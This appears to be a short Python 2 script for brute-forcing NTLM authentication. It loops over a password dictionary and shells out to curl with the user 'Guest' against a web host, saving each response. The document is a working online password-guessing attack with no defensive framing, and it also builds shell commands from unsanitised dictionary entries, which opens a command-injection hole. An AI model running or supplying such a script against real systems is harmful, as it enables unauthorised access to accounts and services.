#Simple NTLM auth brute force
#Thanks to nkpanda
#!/usr/bin/python
import os

resul=open("dictionary.txt","r").read().split('\n')
param1="curl -k --ntlm -u \"Guest:"
param2="\" https://example.com"
for s in resul:
	param3=s
	print param1+param3+param2+" -o "+param3+".html"
	os.system(param1+param3+param2+" -o "+param3+".html")
